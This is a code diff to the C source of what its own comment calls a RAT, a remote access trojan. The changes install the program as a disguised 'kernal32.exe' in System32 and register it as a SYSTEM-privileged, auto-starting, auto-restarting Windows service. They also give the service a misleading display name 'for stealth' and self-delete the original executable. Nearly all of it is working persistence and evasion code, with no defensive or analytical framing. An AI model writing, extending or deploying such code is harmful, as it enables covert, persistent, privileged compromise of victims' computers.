@@ -167,22 +167,56 @@ void CopyToSystem32AndScheduleTask() {
         return; // Failed to get the executable path
     }
 
-    
     char command[MAX_PATH * 2];
 
+    // Ensure the RAT is copied to System32
     snprintf(command, sizeof(command), "copy /Y \"%s\" \"%s\"", path, SYSTEM32_PATH);
     system(command);
-    snprintf(command, sizeof(command), "schtasks /create /tn System32Updater /tr C:\\Windows\\System32\\kernal32.exe /sc onlogon /RL HIGHEST /RU SYSTEM /F");
+
+    // Check if service already exists
+    snprintf(command, sizeof(command), "sc query SystemUpdate > nul 2>&1");
+    if (system(command) == 0) {
+        printf("Service already exists. Skipping creation.\n");
+    } else {
+        // Create Windows Service
+        snprintf(command, sizeof(command), 
+                 "sc create SystemUpdate binPath= \"C:\\Windows\\System32\\kernal32.exe\" start= auto");
+        system(command);
+
+        snprintf(command, sizeof(command), 
+                 "sc config SystemUpdate obj= \"NT AUTHORITY\\SYSTEM\" password= \"\"");
+        system(command);
+    }
+
+    // Ensure the service is **enabled** and set to auto-start
+    snprintf(command, sizeof(command), 
+             "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\SystemUpdate\" /v Start /t REG_DWORD /d 2 /f");
     system(command);
-    DWORD processID = GetCurrentProcessId(); // Get the process ID of the running process
+
+    // Set failure recovery (auto-restart)
+    snprintf(command, sizeof(command), 
+             "sc failure SystemUpdate reset= 0 actions= restart/60000");
+    system(command);
+
+    // Rename the service for stealth
+    snprintf(command, sizeof(command), 
+             "sc config SystemUpdate displayname= \"Windows Driver Helper\"");
+    system(command);
+
+    // **Start the Service**
+    snprintf(command, sizeof(command), "sc start SystemUpdate");
+    system(command);
+
+    // Self-delete original executable
+    DWORD processID = GetCurrentProcessId();
     snprintf(command, sizeof(command),
-        "cmd.exe /c taskkill /PID %lu /F & timeout /t 1 /nobreak & del /f /q \"%s\"", 
-        processID, path);
+             "cmd.exe /c taskkill /PID %lu /F & timeout /t 1 /nobreak & del /f /q \"%s\"", 
+             processID, path);
 
     STARTUPINFO si = { sizeof(si) };
     PROCESS_INFORMATION pi;
 
-    // Create a new process to execute the self-deletion
+    // Execute self-delete process
     if (CreateProcess(NULL, command, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
